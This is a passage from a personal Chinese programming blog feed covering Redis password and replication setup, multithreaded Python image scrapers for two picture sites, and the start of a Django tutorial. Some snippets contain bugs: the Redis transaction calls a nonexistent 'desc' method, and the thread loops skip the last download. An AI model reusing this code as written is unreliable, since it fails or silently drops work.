class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass secret_password</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; quit #重新启动，以生效</span><br><span class="line">root@chenxiyuan:/etc/redis# redis-cli -h 127.0.0.1 -p 6379 </span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">(error) NOAUTH Authentication required. #未验证密码，操作被拒绝</span><br><span class="line">127.0.0.1:6379&gt; auth secret_password</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ping #验证密码后，成功执行</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure></li><li><p>设置永久密码<br>配置文件/etc/redis/redis.conf，打开配置文件找到SECURITY部分，添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass yourpassword</span><br></pre></td></tr></table></figure></li></ol><p>重新启动服务即可</p><h3 id="其他机器连接本机redis"><a href="#其他机器连接本机redis" class="headerlink" title="其他机器连接本机redis"></a>其他机器连接本机redis</h3><p>这里我又开了一台ubuntu:192.168.91.134<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/redis/redis.conf </span><br><span class="line">#注释掉 bind 127.0.0.1 那行，再重启服务</span><br><span class="line">#或者bind 127.0.0.1 192.168.91.134 注意这里是ubuntu的ip地址，如果填的是kali的，则redis服务根本起不来。</span><br><span class="line">sudo service redis-server restart</span><br></pre></td></tr></table></figure></p><p>然后kali:192.168.91.133连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 6379 -h 192.168.91.134</span><br><span class="line">192.168.91.134:6379&gt; ping</span><br><span class="line">(error) NOAUTH Authentication required.</span><br><span class="line">192.168.91.134:6379&gt; auth chenxiyuan</span><br><span class="line">OK</span><br><span class="line">192.168.91.134:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line"># 成功，ubunturedis服务器一定要设置密码，不然会有protected mode 默认是开的，会拒绝访问。</span><br></pre></td></tr></table></figure></p><h2 id="python操作redis"><a href="#python操作redis" class="headerlink" title="python操作redis"></a>python操作redis</h2><h3 id="安装redis"><a href="#安装redis" class="headerlink" title="安装redis"></a>安装redis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">#因为我的kali有两个版本的python，而默认是python2，所以我这样安装</span><br><span class="line">python3 -m pip install redis</span><br></pre></td></tr></table></figure><h3 id="连接redis"><a href="#连接redis" class="headerlink" title="连接redis"></a>连接redis</h3><p>因为python操作redis的方法与redis-cli操作方法基本类似，就不赘述了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from redis import Redis</span><br><span class="line">&gt;&gt;&gt; cache=Redis(host=&apos;127.0.0.1&apos;,port=6379,password=&apos;chenxiyuan&apos;)</span><br><span class="line">&gt;&gt;&gt; cache.set(&apos;username&apos;,&apos;chenxiyuan&apos;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; cache.get(&apos;username&apos;)</span><br><span class="line">b&apos;chenxiyuan&apos;</span><br></pre></td></tr></table></figure></p><h3 id="事务操作"><a href="#事务操作" class="headerlink" title="事务操作"></a>事务操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个管道实例</span></span><br><span class="line">pip = cache.pipeline()</span><br><span class="line"><span class="comment"># 做第一步操作，给BankA自增长1</span></span><br><span class="line">pip.incr(<span class="string">'BankA'</span>)</span><br><span class="line"><span class="comment"># 做第二步操作，给BankB自减少1</span></span><br><span class="line">pip.desc(<span class="string">'BankB'</span>)</span><br><span class="line"><span class="comment"># 执行事务</span></span><br><span class="line">pip.execute()</span><br></pre></td></tr></table></figure><h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><h3 id="建立"><a href="#建立" class="headerlink" title="建立"></a>建立</h3><p>ubuntu:192.168.91.134<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:master</span><br></pre></td></tr></table></figure></p><p>kali:192.168.91.133<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; slaveof 192.168.91.134 6379</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; info replication</span><br><span class="line"># Replication</span><br><span class="line">role:slave</span><br><span class="line">master_host:192.168.91.134</span><br><span class="line">master_port:6379</span><br><span class="line">master_link_status:up</span><br><span class="line">master_last_io_seconds_ago:9</span><br><span class="line">master_sync_in_progress:0</span><br><span class="line">slave_repl_offset:195</span><br><span class="line">slave_priority:100</span><br><span class="line">slave_read_only:1</span><br><span class="line">connected_slaves:0</span><br><span class="line">master_replid:589b79b1011b3c7e933cefc0fb4a8ae8190696b9</span><br><span class="line">master_replid2:0000000000000000000000000000000000000000</span><br><span class="line">master_repl_offset:195</span><br><span class="line">second_repl_offset:-1</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:114</span><br><span class="line">repl_backlog_histlen:82</span><br></pre></td></tr></table></figure></p><h3 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h3><p>从机是无法写的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; set username chenxiyuan</span><br><span class="line">(error) READONLY You can&apos;t write against a read only replica.</span><br></pre></td></tr></table></figure></p><h3 id="主机死掉"><a href="#主机死掉" class="headerlink" title="主机死掉"></a>主机死掉</h3><p>ubuntu: shutdown<br>kali: 还是slave，当主机重新连入写数据，从机还是可以读数据。</p><h3 id="从机死掉"><a href="#从机死掉" class="headerlink" title="从机死掉"></a>从机死掉</h3><p>kali: shutdown,重新连入后为master，除非写入配置。只要再slaveof，还是可以读到主机的所有数据</p><h3 id="反客为主"><a href="#反客为主" class="headerlink" title="反客为主"></a>反客为主</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof no one</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;redis&lt;/code&gt;:&lt;code&gt;REmote DIctionary Server&lt;/code&gt;是一种&lt;code&gt;nosql&lt;/code&gt;数据库，它的数据是保存在内存中，同时&lt;code&gt;redis&lt;/code&gt;可以定时把内存数据同步到磁盘，即可以将数据持久化，并且它比&lt;code&gt;memcached&lt;/code&gt;支持更多的数据结构&lt;code&gt;(string,list列表[队列和栈],set[集合],sorted set[有序集合],hash(hash表))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;更多命令可以查看&lt;a href=&quot;http://redisdoc.com/index.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;REDIS文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="redis" scheme="http://chenxiyuan.vip/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>多线程爬斗图啦</title>
    <link href="http://chenxiyuan.vip/2019/07/17/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E6%96%97%E5%9B%BE%E5%95%A6/"/>
    <id>http://chenxiyuan.vip/2019/07/17/多线程爬斗图啦/</id>
    <published>2019-07-17T03:14:47.000Z</published>
    <updated>2019-07-17T03:22:58.397Z</updated>
    
    <content type="html"><![CDATA[<p>趁热打铁吧，再写一个爬虫练手，也是再次熟悉下BeautifulSoup库的使用。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">dirs=<span class="string">"斗图"</span></span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirs):</span><br><span class="line">        os.mkdir(dirs)</span><br><span class="line">        os.chdir(dirs)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"文件夹已存在"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one_page</span><span class="params">(url)</span>:</span></span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    content = res.content</span><br><span class="line">    soup = BeautifulSoup(content, <span class="string">'lxml'</span>)</span><br><span class="line">    img_list = soup.find_all(<span class="string">'img'</span>, attrs=&#123;<span class="string">'class'</span>: <span class="string">'img-responsive lazy image_dta'</span>&#125;)</span><br><span class="line">    one_page_list =[]</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> img_list:</span><br><span class="line">        t = (img[<span class="string">'alt'</span>],img[<span class="string">'data-original'</span>])</span><br><span class="line">        one_page_list.append(t)</span><br><span class="line">    <span class="keyword">return</span> one_page_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_img</span><span class="params">(img,name,suf,i)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name+ <span class="string">"."</span>+suf, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(<span class="string">"正在下载"</span>+name)</span><br><span class="line">        f.write(img.content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    mkdir()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2605</span>):</span><br><span class="line">        one_page_list=get_one_page(<span class="string">'http://www.doutula.com/photo/list/?page='</span>+str(i))</span><br><span class="line">        threads=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> one_page_list:</span><br><span class="line">            name=re.sub(<span class="string">'[\/:*?"&lt;&gt;|_]'</span>,<span class="string">''</span>,j[<span class="number">0</span>])</span><br><span class="line">            suf=j[<span class="number">1</span>][<span class="number">-3</span>:]<span class="comment">#获取后缀</span></span><br><span class="line">            img = requests.get(j[<span class="number">1</span>])</span><br><span class="line">            t = threading.Thread(target=download_img,args=[img,name,suf,i])</span><br><span class="line">            threads.append(t)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(threads)<span class="number">-1</span>):</span><br><span class="line">            threads[i].start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">            threads[i].join()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;趁热打铁吧，再写一个爬虫练手，也是再次熟悉下BeautifulSoup库的使用。&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/spa
      
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="爬虫" scheme="http://chenxiyuan.vip/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="多线程" scheme="http://chenxiyuan.vip/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>多线程爬妹子图</title>
    <link href="http://chenxiyuan.vip/2019/07/16/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%A6%B9%E5%AD%90%E5%9B%BE/"/>
    <id>http://chenxiyuan.vip/2019/07/16/多线程爬妹子图/</id>
    <published>2019-07-16T09:03:33.000Z</published>
    <updated>2019-07-17T03:43:05.139Z</updated>
    
    <content type="html"><![CDATA[<p>原来的代码有点问题，改了以后成功添加多线程，都跑一分钟，多线程要多爬120张图片，这样看来效率果然高了许多。<br>先上普通的:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dirs=<span class="string">"D:/妹子图"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirs):</span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"妹子图文件夹已存在"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_page</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"https://www.mzitu.com/zipai/"</span></span><br><span class="line">r = requests.get(url,headers=headers)</span><br><span class="line">result=re.findall(<span class="string">"&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;"</span>,r.text,re.S)</span><br><span class="line"><span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_onepage_imgs</span><span class="params">(url)</span>:</span></span><br><span class="line">        r=requests.get(url,headers=headers)</span><br><span class="line">        result=re.findall(<span class="string">'&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;'</span>,r.text,re.S)</span><br><span class="line">        <span class="comment">#print(result[0][0].split())</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_img</span><span class="params">(img,path,i)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path+str(int(random.random()*<span class="number">100</span>)) + <span class="string">".jpg"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(<span class="string">"下载第"</span> + str(i) + <span class="string">"页提交于"</span> + path + <span class="string">"的图片"</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">        mkdir()</span><br><span class="line">        <span class="keyword">print</span> (os.getcwd())</span><br><span class="line">        </span><br><span class="line">        max_page=get_max_page()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(int(max_page),<span class="number">1</span>,<span class="number">-1</span>):</span><br><span class="line">                onepage_list=find_onepage_imgs(<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span> )</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> onepage_list:</span><br><span class="line">                        path=j[<span class="number">0</span>].split()   </span><br><span class="line">                        path=path[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]+path[<span class="number">0</span>][<span class="number">5</span>:<span class="number">7</span>]+path[<span class="number">0</span>][<span class="number">8</span>:<span class="number">10</span>]+path[<span class="number">1</span>]+path[<span class="number">2</span>][<span class="number">0</span>:<span class="number">2</span>]+path[<span class="number">2</span>][<span class="number">3</span>:<span class="number">5</span>]  </span><br><span class="line">                        img=requests.get(j[<span class="number">1</span>])</span><br><span class="line">                        download_img(img,path,i)</span><br></pre></td></tr></table></figure></p><p>必须要说的是，之前下载图片名称是网站上的提交时间，然后提交时间会有相同，所以我判断如果文件名相同则文件名加排序。现在我直接在文件名后加一个随机数,就不用那么麻烦了。下面是多线程爬虫:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">dirs = <span class="string">"D:/妹子图"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirs):</span><br><span class="line">        os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">        os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"妹子图文件夹已存在"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_max_page</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"https://www.mzitu.com/zipai/"</span></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    result = re.findall(<span class="string">"&lt;span aria-current='page' class='page-numbers current'&gt;(.*?)&lt;/span&gt;"</span>, r.text, re.S)</span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_onepage_imgs</span><span class="params">(url)</span>:</span></span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    result = re.findall(</span><br><span class="line">        <span class="string">'&lt;div class="comment-meta commentmetadata"&gt;&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;.*?&lt;/div&gt;.*?&lt;p&gt;&lt;img class="lazy".*?data-original="(.*?)".*?&lt;/p&gt;'</span>,</span><br><span class="line">        r.text, re.S)</span><br><span class="line">    <span class="comment"># print(result[0][0].split())</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_img</span><span class="params">(img,path,i)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path+str(int(random.random()*<span class="number">100</span>)) + <span class="string">".jpg"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        print(<span class="string">"下载第"</span> + str(i) + <span class="string">"页提交于"</span> + path + <span class="string">"的图片"</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    mkdir()</span><br><span class="line">    print(os.getcwd())</span><br><span class="line"></span><br><span class="line">    max_page = get_max_page()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(max_page), <span class="number">1</span>, <span class="number">-1</span>):</span><br><span class="line">        onepage_list = find_onepage_imgs(<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span> + str(i) + <span class="string">"/#comments"</span>)</span><br><span class="line">        threads=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> onepage_list:</span><br><span class="line">            path = j[<span class="number">0</span>].split()</span><br><span class="line">            path = path[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>] + path[<span class="number">0</span>][<span class="number">5</span>:<span class="number">7</span>] + path[<span class="number">0</span>][<span class="number">8</span>:<span class="number">10</span>] + path[<span class="number">1</span>] + path[<span class="number">2</span>][<span class="number">0</span>:<span class="number">2</span>] + path[<span class="number">2</span>][<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">            img = requests.get(j[<span class="number">1</span>])</span><br><span class="line">            t=threading.Thread(target=download_img,args=(img,path,i))</span><br><span class="line">            threads.append(t)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">            threads[i].start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(threads) - <span class="number">1</span>):</span><br><span class="line">            threads[i].join()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原来的代码有点问题，改了以后成功添加多线程，都跑一分钟，多线程要多爬120张图片，这样看来效率果然高了许多。&lt;br&gt;先上普通的:&lt;br&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="爬虫" scheme="http://chenxiyuan.vip/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="多线程" scheme="http://chenxiyuan.vip/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Django框架学习</title>
    <link href="http://chenxiyuan.vip/2019/07/14/Django%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/14/Django框架学习/</id>
    <published>2019-07-13T17:18:16.000Z</published>
    <updated>2019-07-17T15:12:41.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搭建虚拟环境"><a href="#搭建虚拟环境" class="headerlink" title="搭建虚拟环境"></a>搭建虚拟环境</h2><h3 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure><ul><li><p>开辟虚拟空间</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virtualenv Django</span><br><span class="line">#也可以通过-p参数指定python解释器</span><br><span class="line">virtualenv -p C:\Python27\python.exe [virtualenv name]</span><br></pre></td></tr></table></figure></li><li><p>激活虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux/mac: source Django/bin/activate</span><br><span class="line">windows: cd Django/Scripts 执行activate</span><br><span class="line">退出虚拟环境: deactivate</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li>虚拟环境安装django<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install Django</span><br></pre></td></tr></table></figure></li></ul><h3 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" 